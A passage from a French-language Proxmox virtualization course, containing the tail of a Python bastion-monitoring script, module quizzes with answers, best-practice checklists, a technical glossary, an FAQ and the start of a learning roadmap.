        subprocess.run([
            "ansible-playbook", f"/tmp/deploy_key_{user_id}.yml"
        ])
        
    def monitor_bastion_activity(self):
        """Surveillance continue de l'activité bastion"""
        while True:
            # Analyse logs en temps réel
            recent_logins = self.parse_auth_logs()
            
            for login in recent_logins:
                if self.detect_suspicious_activity(login):
                    self.handle_security_alert(login)
                    
            # Vérification sessions expirées
            self.cleanup_expired_sessions()
            
            time.sleep(30)
            
    def detect_suspicious_activity(self, login_event):
        """Détection d'activité suspecte"""
        suspicious_indicators = []
        
        # Connexions depuis IP non autorisées
        if login_event['source_ip'] not in self.config['allowed_source_ips']:
            suspicious_indicators.append("unauthorized_source_ip")
            
        # Tentatives de connexion en dehors des heures autorisées
        current_hour = datetime.now().hour
        if not (8 <= current_hour <= 18):
            suspicious_indicators.append("off_hours_access")
            
        # Trop de tentatives de connexion
        if login_event['failed_attempts'] > 5:
            suspicious_indicators.append("brute_force_attempt")
            
        return len(suspicious_indicators) > 0
        
    def handle_security_alert(self, login_event):
        """Gestion des alertes de sécurité"""
        alert = {
            "timestamp": datetime.now().isoformat(),
            "event_type": "bastion_security_alert",
            "source_ip": login_event['source_ip'],
            "user": login_event['user'],
            "indicators": login_event.get('suspicious_indicators', []),
            "severity": "high"
        }
        
        # Envoi vers SIEM
        self.send_to_siem(alert)
        
        # Blocage automatique si nécessaire
        if "brute_force_attempt" in alert['indicators']:
            self.block_source_ip(login_event['source_ip'])
            
        # Notification équipe sécurité
        self.send_security_notification(alert)

if __name__ == "__main__":
    manager = BastionAccessManager()
    manager.monitor_bastion_activity()
```

### Cas d'usage spécialisés

**Environnement cloud hybride :** Déployez des bastions dans chaque zone de disponibilité avec réplication automatique des configurations et des clés d'accès. Configurez des tunnels VPN site-à-site pour l'accès sécurisé entre clouds.

**Conformité réglementaire :** Implémentez des bastions avec enregistrement complet des sessions (keylogging, screen recording) pour répondre aux exigences SOX, PCI-DSS, ou HIPAA. Configurez la rétention et l'archivage automatique des logs d'audit.

**Environnement DevOps :** Intégrez les bastions avec les pipelines CI/CD pour l'accès automatisé aux environnements de production. Configurez des accès temporaires basés sur les tickets de déploiement avec révocation automatique.

---


## Quiz Module 5 : Haute Disponibilité

**Question 1 :** Quelle est la différence principale entre un cluster actif/passif et actif/actif ?
a) Le nombre de nœuds dans le cluster
b) La répartition de la charge de travail
c) Le type de stockage utilisé
d) La version de Proxmox

**Question 2 :** Dans un cluster Proxmox, quel est le nombre minimum de nœuds recommandé pour éviter le split-brain ?
a) 2 nœuds
b) 3 nœuds
c) 4 nœuds
d) 5 nœuds

**Question 3 :** Quel protocole Ceph utilise-t-il pour la réplication des données ?
a) NFS
b) iSCSI
c) CRUSH
d) DRBD

**Question 4 :** Qu'est-ce que le quorum dans un cluster ?
a) Le nombre total de nœuds
b) La majorité des nœuds nécessaire pour les décisions
c) Le nœud principal du cluster
d) Le stockage partagé

**Question 5 :** Quelle commande permet de vérifier l'état d'un cluster Proxmox ?
a) `pveversion`
b) `pvecm status`
c) `qm list`
d) `pct list`

**Réponses :** 1-b, 2-b, 3-c, 4-b, 5-b

---

## Bonnes Pratiques Module 5

### ✅ Check-list Haute Disponibilité

**Planification cluster :**
- [ ] Dimensionner avec un nombre impair de nœuds (minimum 3)
- [ ] Prévoir la redondance réseau (minimum 2 liens par nœud)
- [ ] Calculer les ressources avec marge de sécurité (N+1 ou N+2)
- [ ] Documenter la topologie et les dépendances

**Configuration réseau :**
- [ ] Configurer des VLANs dédiés pour le trafic cluster
- [ ] Implémenter le bonding réseau pour la redondance
- [ ] Tester la bande passante entre nœuds
- [ ] Configurer la surveillance réseau

**Stockage distribué :**
- [ ] Configurer Ceph avec au moins 3 OSD par nœud
- [ ] Définir des règles CRUSH appropriées
- [ ] Monitorer l'espace disque et les performances
- [ ] Planifier la maintenance des disques

**Surveillance et maintenance :**
- [ ] Configurer les alertes de santé cluster
- [ ] Planifier les mises à jour coordonnées
- [ ] Tester régulièrement les procédures de failover
- [ ] Documenter les procédures d'urgence

---

## Quiz Module 6 : DevOps

**Question 1 :** Quelle est la différence principale entre l'approche déclarative et impérative en IaC ?
a) Le langage de programmation utilisé
b) La description de l'état final vs les étapes pour y parvenir
c) La vitesse d'exécution
d) La compatibilité avec le cloud

**Question 2 :** Dans un pipeline GitLab CI/CD, à quelle étape doit-on typiquement créer les VMs temporaires ?
a) build
b) test
c) prepare
d) deploy

**Question 3 :** Quel est l'avantage principal de Kubernetes sur infrastructure virtualisée ?
a) Réduction des coûts
b) Isolation renforcée (VM + namespace)
c) Simplicité de configuration
d) Compatibilité Windows

**Question 4 :** Quelle commande Terraform permet d'appliquer les changements d'infrastructure ?
a) `terraform plan`
b) `terraform apply`
c) `terraform init`
d) `terraform validate`

**Question 5 :** Dans une architecture microservices, pourquoi utiliser des VMs dédiées par service ?
a) Pour réduire les coûts
b) Pour l'isolation et la scalabilité indépendante
c) Pour simplifier le déploiement
d) Pour améliorer les performances

**Réponses :** 1-b, 2-c, 3-b, 4-b, 5-b

---

## Bonnes Pratiques Module 6

### ✅ Check-list DevOps

**Infrastructure as Code :**
- [ ] Versionner tous les fichiers de configuration infrastructure
- [ ] Utiliser des modules réutilisables (Terraform, Ansible)
- [ ] Implémenter la validation automatique (terraform validate, ansible-lint)
- [ ] Séparer les environnements (dev, staging, prod)

**Pipelines CI/CD :**
- [ ] Isoler chaque build dans des VMs dédiées
- [ ] Implémenter des tests automatisés à chaque étape
- [ ] Configurer le nettoyage automatique des ressources temporaires
- [ ] Monitorer les performances et la durée des pipelines

**Gestion des secrets :**
- [ ] Utiliser des solutions dédiées (Vault, Ansible Vault)
- [ ] Chiffrer les données sensibles en transit et au repos
- [ ] Implémenter la rotation automatique des secrets
- [ ] Auditer l'accès aux secrets

**Monitoring et observabilité :**
- [ ] Déployer une stack de monitoring complète (Prometheus, Grafana)
- [ ] Configurer des alertes proactives
- [ ] Implémenter le tracing distribué
- [ ] Centraliser les logs avec ELK ou équivalent

---

## Quiz Module 7 : Cybersécurité

**Question 1 :** Dans un laboratoire Red Team, pourquoi utiliser des VMs isolées pour les attaquants ?
a) Pour réduire les coûts
b) Pour éviter la contamination de l'infrastructure
c) Pour améliorer les performances
d) Pour simplifier la gestion

**Question 2 :** Quelle est la fonction principale d'une DMZ ?
a) Accélérer le réseau
b) Créer une zone tampon entre Internet et le réseau interne
c) Réduire la latence
d) Augmenter la bande passante

**Question 3 :** Dans une architecture Zero Trust, que signifie "never trust, always verify" ?
a) Bloquer tout le trafic
b) Vérifier chaque connexion indépendamment du contexte
c) Faire confiance aux utilisateurs internes
d) Utiliser uniquement des VPNs

**Question 4 :** Quel est l'avantage principal d'un bastion host ?
a) Améliorer les performances réseau
b) Centraliser et contrôler l'accès aux systèmes internes
c) Réduire les coûts de licence
d) Simplifier la configuration réseau

**Question 5 :** Dans la segmentation réseau, que représente un VLAN ?
a) Un protocole de routage
b) Un domaine de diffusion logique isolé
c) Un type de firewall
d) Un algorithme de chiffrement

**Réponses :** 1-b, 2-b, 3-b, 4-b, 5-b

---

## Bonnes Pratiques Module 7

### ✅ Check-list Cybersécurité

**Laboratoires Red Team :**
- [ ] Isoler complètement les environnements d'attaque
- [ ] Implémenter des snapshots pour la réinitialisation rapide
- [ ] Configurer la surveillance et l'enregistrement de toutes les activités
- [ ] Documenter les scénarios d'attaque et les contre-mesures

**Segmentation réseau :**
- [ ] Implémenter une politique de moindre privilège par défaut
- [ ] Configurer des VLANs dédiés par fonction métier
- [ ] Déployer des firewalls entre chaque segment
- [ ] Monitorer le trafic inter-segments

**DMZ et bastions :**
- [ ] Configurer une DMZ multicouche (externe/interne)
- [ ] Durcir la configuration des bastions (SSH, audit, monitoring)
- [ ] Implémenter l'authentification multi-facteurs
- [ ] Configurer la révocation automatique des accès temporaires

**Surveillance et détection :**
- [ ] Déployer des IDS/IPS sur tous les segments critiques
- [ ] Centraliser les logs de sécurité dans un SIEM
- [ ] Configurer des alertes en temps réel
- [ ] Effectuer des tests de pénétration réguliers

---

## Références Module 5-7

### Documentation officielle
- [Proxmox Cluster Manager](https://pve.proxmox.com/wiki/Cluster_Manager)
- [Ceph Documentation](https://docs.ceph.com/)
- [Terraform Proxmox Provider](https://registry.terraform.io/providers/Telmate/proxmox/)
- [Kubernetes Documentation](https://kubernetes.io/docs/)
- [pfSense Documentation](https://docs.netgate.com/pfsense/)

### RFC et standards
- RFC 3768 : Virtual Router Redundancy Protocol (VRRP)
- RFC 4271 : Border Gateway Protocol 4 (BGP-4)
- RFC 7348 : Virtual eXtensible Local Area Network (VXLAN)
- NIST SP 800-53 : Security Controls for Federal Information Systems

### Blogs et ressources
- [Proxmox Community](https://forum.proxmox.com/)
- [Red Hat OpenShift Blog](https://www.redhat.com/en/blog)
- [SANS Institute](https://www.sans.org/)
- [OWASP Foundation](https://owasp.org/)

---


# Glossaire Technique

## A

**API (Application Programming Interface)** : Interface de programmation permettant l'interaction entre différents logiciels. Dans le contexte de la virtualisation, les APIs permettent l'automatisation et la gestion programmatique des ressources virtuelles.

**Ansible** : Outil d'automatisation open-source utilisant des playbooks YAML pour configurer et gérer l'infrastructure. Particulièrement efficace pour la configuration post-déploiement des machines virtuelles.

**Affinity/Anti-affinity** : Règles définissant si des VMs doivent être placées sur le même hôte physique (affinity) ou séparées (anti-affinity) pour optimiser les performances ou la disponibilité.

## B

**Ballooning** : Technique de gestion dynamique de la mémoire permettant à l'hyperviseur de récupérer la RAM inutilisée des VMs pour la redistribuer selon les besoins.

**Bridge (Pont réseau)** : Dispositif réseau virtuel connectant plusieurs segments réseau au niveau de la couche 2 (liaison de données). Dans Proxmox, vmbr0 est le bridge par défaut.

**Bonding** : Agrégation de plusieurs interfaces réseau physiques en une seule interface logique pour augmenter la bande passante et assurer la redondance.

**Bastion Host** : Serveur sécurisé servant de point d'accès unique et contrôlé vers un réseau interne depuis l'extérieur. Également appelé jump server.

## C

**Ceph** : Système de stockage distribué open-source offrant stockage objet, bloc et fichier avec réplication automatique et haute disponibilité.

**Container (Conteneur)** : Technologie de virtualisation légère partageant le noyau de l'OS hôte tout en isolant les applications. LXC est l'implémentation utilisée par Proxmox.

**CPU Pinning** : Attribution dédiée de cœurs CPU physiques spécifiques à une VM pour optimiser les performances et réduire la latence.

**CRUSH (Controlled Replication Under Scalable Hashing)** : Algorithme utilisé par Ceph pour déterminer la placement et la réplication des données dans le cluster de stockage.

**Cloud-init** : Standard d'initialisation automatique des instances cloud permettant la configuration initiale des VMs (réseau, utilisateurs, packages).

## D

**DMZ (Demilitarized Zone)** : Zone réseau intermédiaire entre Internet et le réseau interne, hébergeant les services publics tout en protégeant l'infrastructure interne.

**DRBD (Distributed Replicated Block Device)** : Solution de réplication de données en temps réel au niveau bloc entre serveurs pour assurer la haute disponibilité.

**Docker** : Plateforme de conteneurisation permettant d'empaqueter des applications avec leurs dépendances dans des conteneurs portables.

## E

**Ephemeral Storage** : Stockage temporaire attaché à une VM qui est perdu lors de l'arrêt de l'instance. Utilisé pour les données temporaires et les caches.

**ESXI** : Hyperviseur bare-metal de VMware offrant des fonctionnalités de virtualisation d'entreprise avec gestion centralisée via vCenter.

**etcd** : Base de données clé-valeur distribuée utilisée par Kubernetes pour stocker la configuration du cluster et l'état des objets.

## F

**Failover** : Processus automatique de basculement vers un système de secours en cas de défaillance du système principal.

**Fencing** : Mécanisme de protection dans un cluster qui isole ou redémarre un nœud défaillant pour éviter la corruption des données.

**Flannel** : Plugin réseau (CNI) pour Kubernetes créant un réseau overlay permettant la communication entre pods sur différents nœuds.

## G

**GPU Passthrough** : Technique permettant à une VM d'accéder directement à une carte graphique physique pour les applications nécessitant l'accélération GPU.

**GitOps** : Méthodologie DevOps utilisant Git comme source de vérité pour la configuration d'infrastructure et les déploiements automatisés.

**Grafana** : Plateforme de visualisation et d'analyse de métriques permettant de créer des tableaux de bord pour le monitoring d'infrastructure.

## H

**HA (High Availability)** : Architecture garantissant un niveau élevé de disponibilité opérationnelle, généralement exprimé en pourcentage (99.9%, 99.99%).

**Hugepages** : Pages mémoire de grande taille (2MB ou 1GB) réduisant la surcharge de gestion de la mémoire virtuelle pour les applications nécessitant de hautes performances.

**Hyperviseur** : Logiciel créant et gérant les machines virtuelles. Type 1 (bare-metal) comme Proxmox, ou Type 2 (hosted) comme VirtualBox.

**HAProxy** : Load balancer et proxy inverse open-source offrant haute disponibilité, répartition de charge et terminaison SSL.

## I

**IaC (Infrastructure as Code)** : Pratique de gestion d'infrastructure via du code versionné et automatisé plutôt que par des processus manuels.

**IOMMU (Input-Output Memory Management Unit)** : Composant matériel permettant la virtualisation des périphériques et le passthrough sécurisé vers les VMs.

**iSCSI** : Protocole permettant l'accès à des périphériques de stockage distants via le réseau IP, créant des SAN (Storage Area Networks).

**Ingress** : Objet Kubernetes gérant l'accès externe aux services du cluster, typiquement HTTP/HTTPS avec routage basé sur les noms d'hôtes.

## J

**Jump Server** : Voir Bastion Host. Serveur intermédiaire sécurisé pour accéder aux systèmes internes depuis l'extérieur.

**Jenkins** : Serveur d'automatisation open-source pour l'intégration et le déploiement continus (CI/CD).

## K

**KVM (Kernel-based Virtual Machine)** : Hyperviseur intégré au noyau Linux transformant Linux en hyperviseur bare-metal. Base technologique de Proxmox.

**Kubernetes** : Plateforme d'orchestration de conteneurs automatisant le déploiement, la mise à l'échelle et la gestion des applications conteneurisées.

**kubectl** : Interface en ligne de commande pour interagir avec les clusters Kubernetes.

## L

**LXC (Linux Containers)** : Technologie de virtualisation au niveau OS permettant d'exécuter plusieurs systèmes Linux isolés sur un seul hôte.

**LVM (Logical Volume Manager)** : Gestionnaire de volumes logiques permettant la gestion flexible des espaces de stockage avec redimensionnement dynamique.

**Load Balancer** : Dispositif distribuant le trafic réseau entre plusieurs serveurs pour optimiser les performances et assurer la disponibilité.

**Lateral Movement** : Technique d'attaque consistant à se déplacer horizontalement dans un réseau après la compromission initiale pour accéder à d'autres systèmes.

## M

**Microservices** : Architecture applicative décomposant une application en services indépendants communiquant via des APIs.

**Migration Live** : Déplacement d'une VM en cours d'exécution d'un hôte physique vers un autre sans interruption de service.

**Monitoring** : Surveillance continue des systèmes et applications pour détecter les problèmes et optimiser les performances.

**Multi-tenant** : Architecture permettant à plusieurs clients (tenants) de partager une infrastructure tout en maintenant l'isolation des données.

## N

**NFS (Network File System)** : Protocole permettant l'accès à des fichiers distants via le réseau comme s'ils étaient locaux.

**NUMA (Non-Uniform Memory Access)** : Architecture où l'accès mémoire varie selon la localisation physique, importante pour l'optimisation des performances VM.

**Namespace** : Mécanisme d'isolation des ressources dans Linux et Kubernetes permettant la séparation logique des processus et objets.

**Network Policy** : Règles Kubernetes définissant comment les pods peuvent communiquer entre eux et avec d'autres endpoints réseau.

## O

**Orchestration** : Automatisation coordonnée de multiples tâches et services pour gérer des workflows complexes.

**OVS (Open vSwitch)** : Switch virtuel open-source supportant les standards réseau et les protocoles SDN comme OpenFlow.

**Overcommit** : Allocation de ressources virtuelles (CPU, RAM) supérieure aux ressources physiques disponibles, basée sur l'utilisation statistique.

**OSD (Object Storage Daemon)** : Démon Ceph gérant le stockage des données sur les disques physiques dans un cluster de stockage distribué.

## P

**Proxmox VE** : Plateforme de virtualisation open-source basée sur KVM et LXC avec interface web de gestion intégrée.

**Pod** : Plus petite unité déployable dans Kubernetes, contenant un ou plusieurs conteneurs partageant le réseau et le stockage.

**Persistent Volume** : Stockage persistant dans Kubernetes indépendant du cycle de vie des pods.

**pfSense** : Distribution firewall/routeur open-source basée sur FreeBSD, utilisée pour la sécurité réseau et la segmentation.

## Q

**QEMU** : Émulateur et virtualiseur open-source utilisé par KVM pour la virtualisation matérielle.

**Quorum** : Nombre minimum de nœuds nécessaires dans un cluster pour prendre des décisions et éviter le split-brain.

**QoS (Quality of Service)** : Mécanismes de priorisation et de limitation du trafic réseau pour garantir les performances des applications critiques.

## R

**Red Team** : Équipe simulant des attaques pour tester la sécurité d'une organisation et identifier les vulnérabilités.

**Replica Set** : Objet Kubernetes maintenant un nombre spécifié de répliques de pods en cours d'exécution.

**RAID (Redundant Array of Independent Disks)** : Technologie combinant plusieurs disques pour améliorer les performances et/ou la redondance.

**RBD (RADOS Block Device)** : Interface de stockage bloc de Ceph permettant l'accès aux données via des volumes virtuels.

## S

**SDN (Software-Defined Networking)** : Approche réseau séparant le plan de contrôle du plan de données pour une gestion centralisée et programmable.

**SIEM (Security Information and Event Management)** : Système centralisant et analysant les logs de sécurité pour détecter les menaces.

**Split-brain** : Situation dans un cluster où les nœuds ne peuvent plus communiquer, risquant des décisions contradictoires.

**Snapshot** : Capture instantanée de l'état d'une VM ou d'un volume de stockage permettant la restauration ultérieure.

**SR-IOV** : Technologie permettant à un périphérique PCIe de présenter plusieurs fonctions virtuelles aux VMs pour de meilleures performances.

## T

**Terraform** : Outil IaC permettant de définir et provisionner l'infrastructure via des fichiers de configuration déclaratifs.

**Thin Provisioning** : Allocation dynamique de l'espace de stockage, allouant l'espace physique uniquement lors de l'écriture effective des données.

**Template** : Image préconfigurée d'une VM servant de base pour créer rapidement de nouvelles instances identiques.

**Taints et Tolerations** : Mécanisme Kubernetes permettant de contrôler sur quels nœuds les pods peuvent être planifiés.

## U

**Uptime** : Temps pendant lequel un système est opérationnel et disponible, généralement exprimé en pourcentage.

**UUID (Universally Unique Identifier)** : Identifiant unique de 128 bits utilisé pour identifier les ressources virtuelles de manière non ambiguë.

## V

**VLAN (Virtual Local Area Network)** : Segmentation logique d'un réseau physique créant des domaines de diffusion isolés.

**vCPU (Virtual CPU)** : Processeur virtuel alloué à une VM, pouvant correspondre à un cœur physique ou une fraction selon la configuration.

**VirtIO** : Framework de virtualisation paravirtualisée offrant de meilleures performances pour les périphériques virtuels.

**vNIC (Virtual Network Interface Card)** : Carte réseau virtuelle permettant à une VM de se connecter aux réseaux virtuels.

**VPN (Virtual Private Network)** : Réseau privé virtuel créant une connexion sécurisée et chiffrée sur un réseau public.

## W

**WAF (Web Application Firewall)** : Firewall applicatif protégeant les applications web contre les attaques spécifiques (OWASP Top 10).

**Webhook** : Mécanisme permettant à une application d'envoyer des données en temps réel vers d'autres applications lors d'événements spécifiques.

## X

**XFS** : Système de fichiers haute performance optimisé pour les gros volumes et les opérations parallèles, souvent utilisé avec Ceph.

## Y

**YAML (YAML Ain't Markup Language)** : Format de sérialisation de données lisible utilisé pour les fichiers de configuration (Ansible, Kubernetes).

## Z

**ZFS (Zettabyte File System)** : Système de fichiers avancé combinant gestionnaire de volumes et système de fichiers avec fonctionnalités de protection des données intégrées.

**Zero Trust** : Modèle de sécurité basé sur le principe "never trust, always verify", vérifiant chaque connexion indépendamment de sa localisation.

**Zone** : Segment réseau ou géographique isolé dans une architecture distribuée, utilisé pour la répartition des charges et la résilience.

---

# FAQ - Questions Fréquentes

## Questions Générales

**Q: Quelle est la différence entre virtualisation et conteneurisation ?**
R: La virtualisation (VMs) émule un matériel complet avec un OS invité, offrant une isolation forte mais avec plus de surcharge. La conteneurisation partage le noyau de l'OS hôte, étant plus légère mais avec une isolation moindre. Les VMs sont idéales pour des OS différents ou l'isolation de sécurité, les conteneurs pour la portabilité applicative et la densité.

**Q: Combien de VMs puis-je faire tourner sur mon serveur ?**
R: Cela dépend des ressources (CPU, RAM, stockage) et des besoins des VMs. Règle générale : comptez 1-2 GB RAM par VM légère, 4-8 GB pour des serveurs d'applications. Pour le CPU, un ratio 4:1 (4 vCPU pour 1 cœur physique) est souvent acceptable pour des charges mixtes. Surveillez les métriques de performance pour ajuster.

**Q: Dois-je choisir KVM, VMware ou Hyper-V ?**
R: KVM (Proxmox) : open-source, gratuit, excellent pour l'apprentissage et les PME. VMware : leader du marché, fonctionnalités avancées, support commercial, coûteux. Hyper-V : intégré Windows, bon pour les environnements Microsoft. Pour débuter, Proxmox offre le meilleur rapport fonctionnalités/coût.

**Q: Comment sauvegarder efficacement mes VMs ?**
R: Utilisez les snapshots pour les sauvegardes rapides avant maintenance, mais ne les gardez pas longtemps (impact performance). Pour les sauvegardes régulières, utilisez Proxmox Backup Server ou des solutions comme Veeam. Planifiez des sauvegardes complètes hebdomadaires et incrémentales quotidiennes. Testez régulièrement la restauration.

## Questions Réseau

**Q: Quelle est la différence entre un bridge et un switch virtuel ?**
R: Un bridge (pont) connecte des segments réseau au niveau 2, transmettant les trames selon les adresses MAC. Un switch virtuel est plus avancé, offrant des fonctionnalités comme les VLANs, QoS, et monitoring. Dans Proxmox, vmbr0 est un bridge Linux, tandis qu'Open vSwitch est un switch virtuel complet.

**Q: Comment configurer plusieurs VLANs sur une seule interface physique ?**
R: Utilisez le VLAN tagging (802.1Q). Configurez l'interface physique en mode trunk, puis créez des sous-interfaces pour chaque VLAN (eth0.10, eth0.20). Dans Proxmox, ajoutez le tag VLAN dans la configuration réseau de chaque VM. Le switch physique doit également supporter le trunking.

**Q: Mes VMs n'arrivent pas à communiquer entre elles, que faire ?**
R: Vérifiez : 1) Les VMs sont sur le même bridge/VLAN, 2) Les firewalls (iptables, Windows Firewall) ne bloquent pas, 3) La configuration IP (même sous-réseau, passerelle correcte), 4) Les règles de sécurité Proxmox, 5) La configuration du switch physique si applicable.

**Q: Comment optimiser les performances réseau des VMs ?**
R: Utilisez VirtIO pour les interfaces réseau (meilleures performances), activez le multiqueue, configurez le bonding sur l'hôte pour la redondance et la bande passante, utilisez des réseaux 10 Gigabit pour les charges importantes, et optimisez les buffers réseau selon votre charge de travail.

## Questions Stockage

**Q: LVM-Thin vs ZFS vs Ceph, lequel choisir ?**
R: LVM-Thin : simple, performant, bon pour débuter. ZFS : fonctionnalités avancées (snapshots, compression, déduplication), excellent pour serveurs uniques. Ceph : stockage distribué, haute disponibilité, complexe à gérer. Choisissez selon vos besoins de disponibilité et votre expertise.

**Q: Comment gérer l'espace disque qui se remplit rapidement ?**
R: Activez thin provisioning, nettoyez régulièrement les snapshots anciens, utilisez la compression (ZFS), configurez des alertes de surveillance, planifiez la croissance avec des disques supplémentaires. Évitez l'overprovisioning excessif sans surveillance.

**Q: Puis-je migrer mes VMs entre différents types de stockage ?**
R: Oui, Proxmox permet la migration de stockage à chaud. Utilisez la fonction "Move disk" dans l'interface web ou la commande `qm move_disk`. La migration peut prendre du temps selon la taille du disque et la vitesse du réseau/stockage.

**Q: Comment optimiser les performances de stockage ?**
R: Utilisez des SSD pour les VMs critiques, configurez le cache approprié (writethrough pour la sécurité, writeback pour les performances), activez discard/TRIM, utilisez des contrôleurs VirtIO SCSI, et séparez les charges (OS sur SSD, données sur HDD).

## Questions Sécurité

**Q: Comment sécuriser mon infrastructure Proxmox ?**
R: Changez les mots de passe par défaut, activez l'authentification à deux facteurs, configurez un firewall, mettez à jour régulièrement, utilisez des certificats SSL valides, limitez l'accès SSH, configurez la surveillance des logs, et séparez les réseaux de gestion.

**Q: Comment isoler complètement des VMs pour la sécurité ?**
R: Utilisez des VLANs séparés, configurez des règles de firewall strictes, désactivez les services non nécessaires, utilisez des templates durcis, configurez la surveillance de sécurité, et considérez l'utilisation de solutions comme AppArmor ou SELinux dans les VMs.

**Q: Comment détecter une intrusion dans mon infrastructure virtualisée ?**
R: Déployez un SIEM centralisé, configurez la surveillance des logs système et réseau, utilisez des IDS/IPS, surveillez les performances anormales, configurez des alertes sur les connexions suspectes, et effectuez des audits de sécurité réguliers.

## Questions Performance

**Q: Mes VMs sont lentes, comment diagnostiquer ?**
R: Vérifiez les métriques : CPU (wait time, steal time), RAM (swap usage), disque (IOPS, latence), réseau (bande passante, erreurs). Utilisez `htop`, `iotop`, `iftop` dans l'hôte et les VMs. Vérifiez l'overcommit des ressources et les conflits de charge.

**Q: Comment optimiser les performances CPU des VMs ?**
R: Utilisez CPU pinning pour les charges critiques, configurez la topologie NUMA correctement, évitez l'overcommit excessif, utilisez le type CPU "host" pour de meilleures performances, et ajustez les priorités selon l'importance des VMs.

**Q: Pourquoi mes VMs consomment-elles plus de RAM que prévu ?**
R: Le ballooning peut être désactivé, la VM peut avoir des fuites mémoire, le cache système consomme de la RAM, ou l'overcommit est mal configuré. Surveillez l'utilisation réelle vs allouée et ajustez les paramètres de ballooning.

## Questions Haute Disponibilité

**Q: Comment configurer un cluster Proxmox simple ?**
R: Minimum 3 nœuds pour éviter le split-brain, réseau dédié pour le cluster, stockage partagé (Ceph ou NFS), configuration identique des nœuds. Utilisez `pvecm create` sur le premier nœud, puis `pvecm add` sur les autres. Testez le failover avant la production.

**Q: Que faire en cas de split-brain dans mon cluster ?**
R: Identifiez le nœud avec les données les plus récentes, arrêtez les nœuds en minorité, corrigez le problème réseau, redémarrez les nœuds un par un. Prévenez avec un nombre impair de nœuds et des liens réseau redondants.

**Q: Comment planifier la maintenance d'un cluster ?**
R: Migrez les VMs vers d'autres nœuds, mettez le nœud en mode maintenance, effectuez les mises à jour, testez le fonctionnement, remettez en service. Planifiez pendant les heures creuses et communiquez avec les utilisateurs.

## Questions DevOps

**Q: Comment automatiser le déploiement de VMs ?**
R: Utilisez Terraform pour l'infrastructure, Ansible pour la configuration, créez des templates standardisés, implémentez des pipelines CI/CD, utilisez cloud-init pour l'initialisation automatique. Versionnez vos configurations et testez en environnement de développement.

**Q: Comment intégrer Proxmox dans mes pipelines CI/CD ?**
R: Utilisez l'API Proxmox, créez des VMs temporaires pour les tests, automatisez le nettoyage après les builds, configurez des environnements éphémères, surveillez l'utilisation des ressources. Considérez des solutions comme GitLab Runner avec exécuteur shell.

**Q: Comment gérer les secrets dans mon infrastructure virtualisée ?**
R: Utilisez HashiCorp Vault ou Ansible Vault, chiffrez les données sensibles, implémentez la rotation automatique, limitez l'accès selon le principe du moindre privilège, auditez l'utilisation des secrets. Ne stockez jamais de secrets en clair dans les configurations.

---

# Feuille de Route d'Apprentissage

## Niveau Débutant (0-3 mois)

### Objectifs
- Comprendre les concepts fondamentaux de la virtualisation
- Installer et configurer un environnement Proxmox de base
- Créer et gérer des VMs simples
- Maîtriser les bases du réseau virtuel

### Prérequis
- Connaissances Linux de base (ligne de commande, éditeurs de texte)
- Notions réseau fondamentales (IP, masques de sous-réseau, routage)
- Accès à un serveur physique ou VM pour les tests

### Semaine 1-2 : Fondamentaux
**Théorie (10h) :**
- Module 1 : Bases Hardware (CPU, RAM, stockage, réseau)
- Comprendre la différence entre virtualisation et conteneurisation
- Étudier les types d'hyperviseurs et leurs cas d'usage

**Pratique (15h) :**
- Installation Proxmox VE sur serveur de test
- Configuration réseau de base (vmbr0)
- Création première VM Ubuntu Server
- Exploration interface web Proxmox

**Exercices :**
1. Installer Proxmox sur un serveur physique ou VM imbriquée
2. Créer 3 VMs avec différents OS (Ubuntu, CentOS, Windows)
3. Configurer l'accès SSH aux VMs Linux
4. Documenter la topologie réseau créée

### Semaine 3-4 : Virtualisation de base
**Théorie (8h) :**
- Module 2 : Virtualisation (KVM, conteneurs LXC)
- Comprendre les drivers VirtIO et leur importance
- Étudier la gestion des ressources (CPU, RAM, stockage)

**Pratique (20h) :**
- Optimisation des VMs (VirtIO, ballooning)
- Création et gestion de templates
- Snapshots et sauvegardes
- Conteneurs LXC vs VMs

**Exercices :**
1. Créer un template Ubuntu optimisé avec VirtIO
2. Déployer 5 VMs à partir du template
3. Configurer le ballooning mémoire
4. Créer un conteneur LXC et comparer avec une VM équivalente

### Semaine 5-6 : Réseau virtuel
**Théorie (8h) :**
- Module 3 : Réseau virtuel (bridges, VLANs)
- Comprendre les concepts de segmentation réseau
- Étudier les protocoles réseau dans la virtualisation

**Pratique (20h) :**
- Configuration VLANs sur Proxmox
- Création de réseaux isolés
- Tests de connectivité inter-VMs
- Configuration firewall de base

**Exercices :**
1. Créer 3 VLANs (DMZ, LAN, MGMT)
2. Déployer des VMs dans chaque VLAN
3. Configurer les règles de firewall entre VLANs
4. Tester la connectivité et l'isolation

### Semaine 7-8 : Stockage
**Théorie (6h) :**
- Module 4 : Stockage (local, LVM, ZFS)
- Comprendre les différents types de stockage
- Étudier les concepts de performance et redondance

**Pratique (18h) :**
- Configuration stockage LVM-Thin
- Tests de performance disque
- Gestion des snapshots
- Migration de stockage

**Exercices :**
1. Configurer un pool de stockage LVM-Thin
2. Créer des snapshots avant/après modifications
3. Migrer une VM entre différents stockages
4. Mesurer les performances avec fio

### Semaine 9-12 : Consolidation et projets
**Projets pratiques (40h) :**

**Projet 1 : Infrastructure web simple**
- Déployer un serveur web (Apache/Nginx)
- Configurer une base de données (MySQL/PostgreSQL)
- Mettre en place un reverse proxy
- Documenter l'architecture

**Projet 2 : Environnement de développement**
- Créer des VMs pour différents environnements (dev, test, staging)
- Automatiser le déploiement avec des scripts
- Configurer la sauvegarde automatique
- Implémenter la surveillance de base

**Évaluation :**
- Quiz de fin de niveau (50 questions)
- Présentation d'un projet personnel
- Démonstration pratique des compétences acquises

---

## Niveau Intermédiaire (3-8 mois)

### Objectifs
- Maîtriser la haute disponibilité et le clustering
- Automatiser l'infrastructure avec IaC
- Implémenter des solutions de monitoring avancées
- Comprendre les concepts DevOps appliqués à la virtualisation

### Prérequis
- Maîtrise du niveau débutant
- Connaissances réseau avancées (routage, VPN)
- Bases de programmation (Python, Bash)
- Compréhension des concepts DevOps

### Mois 1 : Haute disponibilité
**Théorie (15h) :**
- Module 5 : Haute disponibilité et clustering
- Étudier les architectures redondantes
- Comprendre les concepts de failover et load balancing

**Pratique (35h) :**
- Configuration cluster Proxmox 3 nœuds
- Déploiement Ceph pour stockage distribué
- Tests de failover et récupération
- Optimisation des performances cluster

**Exercices :**
1. Déployer un cluster Proxmox 3 nœuds
2. Configurer Ceph avec réplication 3x
3. Tester le failover automatique des VMs
4. Implémenter la surveillance du cluster

### Mois 2 : Automatisation et IaC
**Théorie (12h) :**
- Module 6 : Infrastructure as Code
- Étudier Terraform et Ansible
